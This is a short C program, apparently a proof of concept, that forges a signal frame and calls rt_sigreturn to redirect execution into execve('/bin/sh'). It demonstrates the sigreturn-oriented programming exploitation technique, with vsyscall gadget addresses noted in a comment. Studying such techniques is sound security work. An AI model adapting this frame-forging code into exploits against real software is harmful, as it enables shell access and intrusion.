#include <stdlib.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>

/*

0xffffffffff600000: mov $0x60, %rax
e: syscall
0xffffffffff600009: retq
    */

char *cmd = "/bin/sh";
char *arg[] = {cmd, NULL};

inline void dummy()
{
    asm("syscall");
}

int main()
{
    __uint64_t sigframe[32];
    __uint64_t syscall_retq = 0xffffffffff600007;
    __uint64_t *rax = sigframe + 18;
    __uint64_t *rdi = sigframe + 13;
    __uint64_t *rsi = sigframe + 14;
    __uint64_t *rdx = sigframe + 17;
    __uint64_t *r10 = sigframe + 7;
    __uint64_t *r8 = sigframe + 5;
    __uint64_t *r9 = sigframe + 6;
    __uint64_t *rbp = sigframe + 15;
    __uint64_t *rsp = sigframe + 20;
    __uint64_t *rip = sigframe + 21;
    unsigned short *cs = (unsigned short *)(sigframe + 23);
    register __uint64_t _rsp asm("rsp");
    printf("current %%rsp: %016llx\n", _rsp);
    memset(sigframe, 0, sizeof(sigframe));
    *cs = 0x33;
    *rsp = _rsp; // recover
    *rax = 59; // sys_execve
    *rdi = (__uint64_t)cmd; // const char *filename
    *rsi = (__uint64_t)arg; // const char *arg[]
    *rdx = 0; // const char *env[]
    *rip = (__uint64_t)dummy + 4;
    _rsp = (__uint64_t)sigframe;
    asm("mov $0xf, %rax");
    asm("syscall");
    return 0;
}
